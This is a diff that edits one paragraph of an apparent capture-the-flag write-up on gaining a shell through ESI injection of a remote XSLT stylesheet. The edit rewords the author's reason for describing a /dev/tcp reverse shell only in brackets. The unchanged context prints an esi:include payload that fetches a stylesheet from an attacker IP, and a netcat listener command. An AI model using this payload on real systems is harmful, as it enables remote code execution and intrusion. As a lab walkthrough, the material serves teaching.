@@ -100,7 +100,7 @@ You aim an ESI include at that stylesheet and the cache runs it. Single commands
 id=...<esi:include src="http://localhost/" stylesheet="http://10.10.14.4/iceberg.xsl"/>
 ```
 
-Where the dropped script is just [ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]. I am not printing the live shell, and that restraint is the whole point. The dangerous part of this chain is one line, and the safest place for that one line is a bracket in a write-up. Fire the include, and a prompt lands.
+Where the dropped script is just [ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ], kept in brackets because the whole exploit fits in that one line and you really do not want a working copy of it sitting on your disk. Fire the include, and a prompt lands.
 
 ```
 $ nc -lvnp 443
